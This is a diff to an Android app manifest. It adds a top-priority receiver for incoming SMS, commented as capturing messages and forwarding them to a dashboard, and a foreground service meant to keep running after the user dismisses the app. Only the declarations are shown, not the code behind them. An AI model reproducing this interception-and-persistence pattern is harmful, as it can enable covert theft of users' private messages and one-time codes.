@@ -10,6 +10,11 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
+    <!-- Foreground heartbeat service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
     <application
         android:name=".OnyxApp"
         android:label="@string/app_name"
@@ -43,5 +48,22 @@
             android:name=".sms.ui.SmsAnalyticsActivity"
             android:label="SMS Analytics"
             android:exported="false" />
+
+        <!-- Captures incoming SMS and forwards them to the dashboard -->
+        <receiver
+            android:name=".network.SmsBroadcastReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Persistent heartbeat service — keeps the device online even when
+             the user has swiped the app away from the recents list. -->
+        <service
+            android:name=".network.HeartbeatForegroundService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
     </application>
 </manifest>
